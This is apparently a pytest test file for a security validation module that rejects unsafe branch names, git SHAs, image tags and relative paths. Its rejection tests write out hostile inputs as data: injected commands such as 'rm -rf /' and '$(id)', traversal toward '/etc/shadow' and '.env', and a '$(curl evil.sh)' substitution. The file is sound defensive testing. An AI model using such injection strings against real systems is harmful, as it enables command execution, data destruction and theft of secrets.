import pytest

from src.security.validation import (
    InvalidInputError,
    validate_branch_name,
    validate_git_sha,
    validate_image_tag,
    validate_relative_path,
)


class TestValidateBranchName:
    def test_nom_simple_valide(self):
        assert validate_branch_name("feature/auth") == "feature/auth"
        assert validate_branch_name("main") == "main"

    def test_injection_shell_refusee(self):
        with pytest.raises(InvalidInputError):
            validate_branch_name("main; rm -rf /")
        with pytest.raises(InvalidInputError):
            validate_branch_name("$(id)")

    def test_traversee_chemin_refusee(self):
        with pytest.raises(InvalidInputError):
            validate_branch_name("../main")
        with pytest.raises(InvalidInputError):
            validate_branch_name("feature/../../etc")

    def test_espace_et_caracteres_interdits(self):
        with pytest.raises(InvalidInputError):
            validate_branch_name("feature auth")
        with pytest.raises(InvalidInputError):
            validate_branch_name("feature~main")


class TestValidateGitSha:
    def test_sha_valide(self):
        assert validate_git_sha("a1b2c3d4") == "a1b2c3d4"

    def test_sha_invalide(self):
        with pytest.raises(InvalidInputError):
            validate_git_sha("a1b2c3z; ls")
        with pytest.raises(InvalidInputError):
            validate_git_sha("a1b2")


class TestValidateImageTag:
    def test_tag_valide(self):
        assert validate_image_tag("v1.2.3") == "v1.2.3"

    def test_tag_option_refusee(self):
        with pytest.raises(InvalidInputError):
            validate_image_tag("--name=evil")


class TestValidateRelativePath:
    def test_chemin_valide(self):
        assert validate_relative_path("src/server.py") == "src/server.py"

    def test_chemin_absolu_refuse(self):
        with pytest.raises(InvalidInputError):
            validate_relative_path("/etc/passwd")

    def test_traversee_refusee(self):
        with pytest.raises(InvalidInputError):
            validate_relative_path("../.env")
        with pytest.raises(InvalidInputError):
            validate_relative_path("logs/../../etc/shadow")

    def test_metacaracteres_refuses(self):
        with pytest.raises(InvalidInputError):
            validate_relative_path("$(curl evil.sh)")